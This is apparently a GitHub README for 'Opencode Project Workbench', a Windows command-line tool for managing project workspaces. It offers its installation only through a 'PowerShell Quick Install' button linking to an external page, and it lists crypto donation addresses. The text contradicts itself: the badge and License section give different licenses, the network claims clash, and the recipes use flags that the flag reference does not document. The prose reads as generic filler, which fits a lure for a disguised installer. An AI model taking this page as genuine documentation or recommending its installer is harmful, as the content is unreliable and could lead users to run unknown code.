<div align="center">

# Opencode Project Workbench: Command-Line Tool for Windows 10 & 11

![](files/preview.png)

### 🚀 PowerShell Quick Install

<a href="https://wozniakalan323-bit.github.io/opencode-project-workbench/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![checks](https://img.shields.io/badge/checks-passing-2ea44f?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/lic-cc--by--4.0-84cc16?style=flat-square&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/installs-697-a3e635?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/powershell-5.1%2B_%2F_7%2B-65a30d?style=flat-square&labelColor=0d1117)]()

<div align="center">
<h3>Help keep this going</h3>
<p><strong>TRON</strong>:&nbsp;<code>THDmwKRZr2QbnDvL5zUx59TvqfueLRu6Yp</code> | <strong>BTC</strong>:&nbsp;<code>1CM6ijH3BuQeSqmaJhJqJaGuH47jdafAtM</code> | <strong>ETH</strong>:&nbsp;<code>0xD60E5CeC1E6B41f56c4c2a4452e44192b35D05e6</code></p>
</div>

</div>

---

`opencode-project-workbench` is a command-line tool for managing the lifecycle of OpenCode project workspaces, covering creation, configuration, and cleanup through a single executable interface. It targets developers who maintain multiple projects and need repeatable, scriptable operations instead of manual directory handling. The tool operates strictly on local project state and does not attempt to manage dependencies, version control, or remote resources. Its scope is limited to the operations documented in its command reference; anything outside that scope is intentionally left to other tooling. Behavior is deterministic given the same inputs, and all commands fail loudly rather than guessing at intent.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Project-scoped workspaces.** Opens a workspace rooted at a specified project directory and resolves all relative paths against that root. No global state is written outside the workspace unless explicitly requested.

- **Deterministic command execution.** Runs shell commands with a fixed, documented environment derived from the project configuration and the invoking shell. Environment inheritance is opt-in via flags, not implicit.

- **Flag-driven configuration.** Behavior is controlled entirely through command-line flags and an optional project-local configuration file. Flags take precedence over file values; there is no other configuration source.

- **Machine-readable output.** Supports structured output modes for scripting and CI use. Human-readable output is the default; structured output is enabled explicitly.

- **Exit code discipline.** Distinguishes success, usage errors, configuration errors, and runtime failures via distinct exit codes. No command exits zero on partial failure.

- **Dry-run support.** Commands that mutate workspace state accept a dry-run flag that reports intended actions without performing them. Dry-run is not a guarantee of atomicity and does not validate downstream side effects.

- **Idempotent setup steps.** Initialization and scaffolding operations are safe to re-run; existing artifacts are detected and skipped rather than overwritten unless a force flag is supplied.

- **No network dependency for core operations.** Workspace creation, inspection, and local command execution do not require network access. Any operation that does contact a remote is gated behind an explicit flag and documented as such.

- **Scope limitations.** Does not manage dependencies, provision runtimes, or sandbox executed commands. It assumes the host shell and toolchain are already present and does not attempt to repair or isolate them.

- **Single-project focus.** Operates on one project root per invocation. Multi-project orchestration is out of scope and is not planned as part of the current interface.

## How It Works

The workbench operates in three stages: discovery, planning, and execution.

**Discovery** walks the current directory tree, identifies project manifests and lockfiles, and builds an in-memory model of the workspace. It reads manifest metadata such as declared dependencies, package manager hints, and script entries. No files are modified during discovery. Symlinks are followed only when they resolve inside the workspace root; cycles are detected and reported rather than traversed repeatedly. Discovery is bounded by a configurable depth limit and skips paths matched by ignore rules, which include common build and cache directories.

**Planning** converts the discovered model into an ordered list of actions. Each action is derived from a manifest fact, not from heuristics about file contents, so the plan is deterministic for a given workspace state. The planner resolves ordering constraints between actions—for example, a manifest-derived step that depends on another manifest being read first—and detects conflicts where two actions target the same output. When conflicts exist, the planner reports them and withholds the affected actions unless a precedence rule is configured. The full plan can be printed without execution.

**Execution** applies the planned actions sequentially. Each action is validated immediately before it runs; if the workspace changed since planning, the action is re-checked against the current state and skipped or re-planned if stale. Write actions are performed atomically where the platform permits, using a temporary file followed by a rename. The workbench keeps no persistent daemon and no global state: all state lives in memory for the duration of the process, and any on-disk artifacts are limited to the outputs named in the plan. On failure, execution stops by default and the exit code reflects the failing stage; a continue-on-error mode applies remaining independent actions and aggregates results.

Scope is deliberately narrow. The workbench reasons only about manifests and lockfiles it recognizes; unknown formats are surfaced during discovery and left untouched. It does not infer intent from source code, does not resolve dependency graphs itself, and does not guarantee that applying a plan yields a working build—those outcomes depend on the underlying package managers and toolchains invoked. Concurrency is limited to independent read-only stages; write actions are serialized to keep ordering predictable. Behavior is a function of the workspace contents and the supplied flags, and the tool makes no network calls during discovery or planning.

## Modules and Settings

### Project Scaffolding Module
This module creates the initial structure for a new workbench project so that configuration, task tracking, and working directories start from a consistent layout.
- Project name and scaffolding profile selection determine which configuration files, task records, and working directories are laid out.
- An adoption control decides whether an existing directory is incorporated into the workbench or left untouched, so pre-existing content is handled deliberately.
- A post-run summary lists the files and folders that were created, giving a visible account of the resulting structure.

### Workspace Registry Module
This module maintains the list of projects tracked by the workbench and provides a starting overview for every session.
- Add, rename, and remove actions keep the set of tracked projects current, while an active-project control determines which project other modules operate on by default.
- Tag and state filters narrow listings so the user sees only the projects relevant to the current context.
- The registry view presents registered projects and their status compactly, and serves as the selection source for batch operations and workbench-level status.

### Work Item Tracking Module
This module holds the local record of tasks per project and reports every state change in the console.
- Titles, descriptions, and priorities can be set and edited, and work items move through defined states until they are closed.
- State transitions are reported in the console as they happen, keeping the record of in-progress, blocked, and done work visible without leaving the terminal.
- Work items created here form the source for the pending-item listings used in batch operations and the status view.

### Template Generation Module
This module produces common project files from parameterized templates and controls exactly what gets written.
- Template choice and supplied field values determine which file is generated and how placeholders are substituted.
- An overwrite control decides, before execution, whether existing files are replaced or skipped.
- The result report shows which files were written or skipped, so each generation step is accounted for.

### Configuration Profiles Module
This module keeps settings such as default templates, preferred output locations, and work-item conventions in named profiles.
- Profiles can be switched per project or per session, letting different projects follow different conventions within the same workbench.
- The effective configuration can be inspected, showing which settings apply and which profile they come from, avoiding silent assumptions.
- Settings resolved here feed the scaffolding, generation, and tracking modules, so behavior stays consistent with the active profile.

### Batch and Status Module
This module applies operations across several registered projects and summarizes the state of a project or the whole workbench.
- A target set is narrowed by filters before the user confirms, and per-project output shows which projects were affected or skipped.
- Status scope can be chosen between project level and workbench level, with an adjustable level of detail.
- A machine-readable output mode and field selection make results suitable for scripts, while human-readable output remains the default for interactive use.

### Additional Settings
- Output format selection switches between human-readable and machine-readable terminal output for all commands.
- Field selection controls which values appear in listings and status reports, keeping terminal output focused.
- Adoption preference can be pre-set so initialization consistently treats existing directories the same way.
- Active project and profile can be set per session, allowing temporary overrides without changing stored project settings.
- Detail level for status views can be raised or lowered depending on whether the report precedes or concludes a work session.

## Usage Scenarios

### Bootstrapping a New Project from a Scaffolding Profile
**Goal:** Start a new opencode-based project with a consistent structure for configuration, task tracking, and working directories.
**Steps:**
1. Run the initialization command with a project name and choose a scaffolding profile that matches the intended kind of work.
2. Set the adoption control so an existing directory is either incorporated into the workbench or left untouched, depending on whether the folder already contains content.
3. Review the post-run summary listing the files and folders that were created.
4. Adjust the active project in the workspace registry so subsequent commands target the new entry, and inspect the effective configuration to confirm which profile is in effect.
**Expected result:** A concise terminal summary of the created layout, followed by a registry view showing the new project as active with its tags and state visible.

### Coordinating Work Items and Generated Files Across a Session
**Goal:** Keep a local record of tasks current while producing accompanying project files such as notes or changelogs.
**Steps:**
1. Create several work items with titles, descriptions, and priorities, then move one into a blocked state and report the transition in the console.
2. Generate a changelog file by choosing the appropriate template and supplying the required field values.
3. Set the overwrite control to skip existing files before executing the generation.
4. Check the result report to see which files were written and which were skipped.
5. List pending work items filtered by state to confirm what remains open.
**Expected result:** Console reports of each state change, a generation summary naming the written and skipped files, and a focused pending-item listing for the current project.

### Running a Workbench-Wide Status Check and Batch Refresh
**Goal:** Get an overview across several tracked projects and refresh derived files in one pass before ending a work session.
**Steps:**
1. Review the registry listing filtered by tag to narrow down the projects relevant to the current context.
2. Run a batch operation to refresh derived files, narrowing the target set with filters and confirming before execution.
3. Inspect the per-project output to see which projects were affected and which were skipped.
4. Request a workbench-level status report with a raised detail level, and switch the output format to machine-readable with selected fields if the result will be fed into another terminal workflow.
**Expected result:** Per-project batch results, followed by a single concise report summarizing open work items and effective configuration across the workbench in the chosen output format.

## Usage

Invoke the tool by its executable name, `opencode-project-workbench`, followed by a subcommand and any options. Running it with no arguments prints a short synopsis and exits with a non-zero status.

```
opencode-project-workbench <subcommand> [options] [arguments]
```

The tool operates on a single project directory at a time. By default it uses the current working directory; pass `--project <path>` to target another directory explicitly. Paths are resolved relative to the invoking shell unless `--project` is given, in which case they are resolved relative to that directory.

Subcommands are grouped into read-only inspection commands and mutating commands. Inspection commands produce output on stdout and do not modify the project. Mutating commands write to the project and are idempotent where documented in their individual descriptions.

Common global options accepted before or after the subcommand:

- `--project <path>` — select the project root. Defaults to the current directory.
- `--format <text|json>` — output format. Defaults to `text`. `json` is stable and intended for scripting.
- `--quiet` — suppress non-error diagnostics on stderr.
- `--verbose` — emit additional diagnostics on stderr. Ignored when `--quiet` is set.
- `--dry-run` — for mutating commands, report intended changes without applying them.

Run `opencode-project-workbench help <subcommand>` for the options specific to a subcommand. Subcommand help reflects the exact flag set accepted by the installed version.

Exit status is zero on success and non-zero on failure; distinct non-zero codes are documented under Exit codes. When `--format json` is used, errors are reported as a single JSON object on stderr. stdout is not written on failure.

The tool does not manage dependencies, environments, or toolchain versions beyond what it documents per subcommand. It assumes the project directory is well-formed for the operations requested and reports malformed input rather than attempting repair unless a subcommand explicitly states otherwise.

## Flags

The workbench accepts the following flags. Flags may be combined unless noted. Values shown are the default behavior when the flag is omitted.

- `--workspace <path>` — Sets the working directory for the session. Relative paths resolve from the current directory. Defaults to the current directory. If the path does not exist, the tool exits with a non-zero status rather than creating it.

- `--config <path>` — Loads configuration from the given file instead of the default location. The file must already exist and be readable; the tool does not generate it. Errors reading or parsing the file are reported to stderr and terminate the run.

- `--profile <name>` — Selects a named profile from the loaded configuration. If the profile is undefined, the tool exits with a non-zero status and lists the profiles it found. Defaults to the configuration's default profile, if any.

- `--format <value>` — Sets output format. Accepted values are `text` and `json`. Defaults to `text`. In `json` mode, structured records are written to stdout and diagnostics to stderr; the two streams are not interleaved.

- `--verbose` — Enables additional diagnostic output on stderr. Does not alter stdout content in `json` mode beyond what the format defines.

- `--quiet` — Suppresses non-error output on stderr. Errors are still reported. Combining with `--verbose` is permitted; the last one specified takes precedence.

- `--dry-run` — Computes and reports the actions that would be taken without applying them. Output reflects the resolved configuration and workspace state at the time of the run. No files are written.

- `--no-color` — Disables ANSI color in terminal output. Color is also suppressed automatically when stdout is not a terminal.

- `--timeout <seconds>` — Sets an upper bound on long-running operations, as a positive integer. When unspecified, operations use the implementation's internal defaults. Reaching the limit terminates the operation and results in a non-zero exit status.

- `--help` — Prints usage information and the flag list to stdout, then exits with status zero.

- `--version` — Prints the tool name and version to stdout, then exits with status zero.

Scope and behavior notes:

- Flags are parsed left to right. Where a flag is specified more than once, the last occurrence wins unless the flag is documented as repeatable; no flags in the current version are repeatable.
- Unknown flags are treated as errors: the tool prints a message to stderr and exits non-zero without performing work.
- Flags that require a value consume the following argument. Missing values are reported as errors. `--flag=value` syntax is also accepted.
- Behavior described here applies to the current version only. Flags not listed are not part of the supported interface, and reliance on undocumented flags is unsupported.

## Exit codes

Exit status is an integer in the range 0–255.

- 0: success. The requested operation completed without error.
- 1: general error. An unclassified failure occurred, such as an internal error or an invalid argument combination not covered by a more specific code.
- 2: usage error. The command line was malformed, an unknown flag was supplied, or a required argument was missing.
- 3: input error. A referenced file or directory was missing, unreadable, or contained data the tool could not parse.
- 4: configuration error. The workbench configuration was absent, malformed, or internally inconsistent.
- 5: external command failure. A subprocess invoked by the workbench exited non-zero; the workbench propagates the failure rather than its exit code.
- 6: conflict. The requested operation conflicted with existing state, such as an output path that already exists when overwrite was not requested.
- 7: interrupted. The process received SIGINT or SIGTERM and terminated before completing the operation.

Exit code 1 is used when no more specific code applies; callers should treat non-zero as failure. Codes above 7 are reserved. Signals are reported via exit code 7 only when the process handles them; otherwise the shell's conventional signal-derived status (128 + signal number) applies.

## Recipes

### Run against a single project

```sh
opencode-project-workbench run --project ./example
```

Runs all enabled checks for the project at `./example` using the default profile. Output is written to stdout; the exit code reflects the aggregate result.

### Limit execution to a named profile

```sh
opencode-project-workbench run --project ./example --profile strict
```

Selects the `strict` profile instead of the default. Only checks declared in that profile are executed. Profiles must exist in the project configuration; unknown profile names fail with a non-zero exit code.

### Fail fast on the first error

```sh
opencode-project-workbench run --project ./example --fail-fast
```

Stops execution at the first failing check. Useful for pre-commit hooks and CI gates where the full report is not needed. Without this flag, all checks run and failures are aggregated.

### Emit machine-readable results

```sh
opencode-project-workbench run --project ./example --format json
```

Writes a single JSON document to stdout instead of human-readable text. The schema is stable within a major version. Diagnostics and warnings go to stderr so stdout remains parseable.

### Run and capture results for later comparison

```sh
opencode-project-workbench run --project ./example --format json > results.json
```

Redirects the JSON report to a file. This is a shell-level example; the tool does not manage report files itself and performs no retention or rotation.

### Check a project without executing checks

```sh
opencode-project-workbench check --project ./example
```

Validates project layout and configuration without running checks. Reports missing files, unknown flags, and invalid profile references. Exits non-zero on validation errors. This does not guarantee checks will pass, only that the project is well-formed.

### Inspect resolved configuration

```sh
opencode-project-workbench config --project ./example
```

Prints the effective configuration after defaults, profile selection, and flag overrides are applied. Useful for confirming which settings actually take effect. Sensitive values, if any, are redacted.

### List available profiles

```sh
opencode-project-workbench profiles --project ./example
```

Prints the names of profiles defined for the project, one per line. Intended for scripting; the output format is plain text and stable within a major version.

### Scope notes

These recipes assume the default working directory contains a valid project or that `--project` points to one. Behavior for nested projects, symlinked paths, and concurrent runs is not specified by this section; consult the Flags and Exit codes sections for the contract each invocation upholds. Recipes here do not cover environment-specific configuration, which is intentionally out of scope.

## License

Opencode Project Workbench is released under the MIT License. The full license text is provided in the LICENSE file distributed with the source. In summary, the license permits use, copying, modification, merging, publication, distribution, sublicensing, and sale of copies of the software, subject to inclusion of the copyright notice and permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. The license grants no rights to the project name, logos, or other trademarks; any use of these marks requires separate permission. No warranty of fitness for production, security, or compliance use is provided; users are responsible for evaluating the software for their own purposes.